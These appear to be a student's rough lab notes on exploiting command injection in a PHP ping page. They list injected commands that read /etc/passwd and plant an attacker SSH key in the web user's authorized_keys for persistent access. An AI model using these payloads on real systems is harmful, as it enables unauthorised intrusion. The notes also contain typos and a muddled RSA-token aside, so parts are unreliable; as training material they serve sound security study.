### Application on the server is vulnerable,
### allowing execution of arbitrary commands
### User input not validated
### Common example is a SOHO router, with a web page to allow ping
SPECIFY ABSOLUTE PATH EVERYTIME WHILE DOING THIS DO NOT CD 
system("ping -c 1 ".$_GET["ip"]);
###  ^^^contain the following in it’s code
HOW DID WE GET TO THE COMMAND INJECTION ??!!?? we used the robots.txt 
ALWAYS TRY ; whoami 

### Run the following to chain/stack our arbitrary command
; cat /etc/passwd


### find the user you are currently 

pwd 
ls -al

### RSA tokens are hardware devices or software applications that generate a unique code to authenticate a user's access to a network service, server, VPN, or email

; mkdir /var/www/.ssh 

### bellow is done from terminal 

ls -al 

ls ../../../../../../..s
ssh-keygen -t rsa -b 4096 ### if your ssh file is empty when it asks you for a password just hit enter 

cat ../../.ssh/id_rsa.pub
 ## copy the contents ##
ls -la ../../.ssh/


##back to the command injection site 

; echo "(paste ==student@lin-ops)">>/var/www/.ssh/authorized_keys ##not the actual conents drop everything between the () in stead us the past content 

### attempt to ssh to the webserver 

ssh www-data@ 


